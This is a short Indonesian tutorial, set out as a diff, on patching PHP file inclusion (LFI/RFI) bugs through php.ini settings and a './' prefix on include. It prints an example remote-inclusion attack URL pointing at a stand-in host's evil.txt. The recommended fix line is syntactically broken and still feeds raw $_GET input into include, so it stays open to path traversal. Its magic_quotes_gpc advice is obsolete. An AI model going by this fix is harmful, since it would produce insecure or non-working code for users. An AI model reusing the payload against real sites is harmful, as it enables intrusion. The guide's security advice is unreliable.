@@ -1,0 +1,25 @@
+Patch Bug LFI
+
+Patch Bugs LFI
+
+1. Validasi variable.
+
+2. Konfigurasi kembali settingan php pada server website.
+
+allow_url_include = off
+
+allow_url_fopen = off
+
+magic_quotes_gpc = on
+
+3. Pada include mungkin bisa ditambahkan ./
+
+jadinya kyq gini,
+
+include(“./”$_GET[imagefile].”.php”);
+
+tujuannya agar saat kita mengakses file dari luar server maka hasilnya akan error karena saat pemrosesan setiap file yang masuk ke variable page akan ditambah ./ di depannya.
+
+http://www.victim.com/index.php?imagefile=http://www.[remote].com/evil.txt
+
+Dengan seperti ini server atau website yang diinject akan mencari file http://www.victim.com/evil.txt dan pastinya akan menyebabkan server menampilkan error bahwa tidak ditemukannya file tsb.
